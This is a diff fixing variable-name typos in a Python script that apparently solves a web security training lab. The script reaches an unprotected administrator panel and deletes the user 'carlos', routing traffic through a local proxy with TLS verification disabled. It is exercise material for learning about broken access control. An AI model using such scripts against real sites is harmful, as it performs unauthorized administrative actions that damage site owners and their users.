@@ -6,12 +6,12 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}
 
 def delete_user(url):
-    admine_panel_url = url + '/administrator-panel'
-    r = requests.get(admin_url_panel,verify= False,proxies = proxies)
+    admin_panel_url = url + '/administrator-panel'
+    r = requests.get(admin_panel_url,verify= False,proxies = proxies)
     if r.status_code == 200:
         print('(+)Found the administrator panel')
         print('(+)deleting the user carlos')
-        delete_carlos_url = admine_panel_url + '/delete?username=carlos'
+        delete_carlos_url = admin_panel_url + '/delete?username=carlos'
         r = requests.get(delete_carlos_url,verify=False,proxies=proxies)
         if r.status_code == 200:
             print('(+)user carlos deleted')
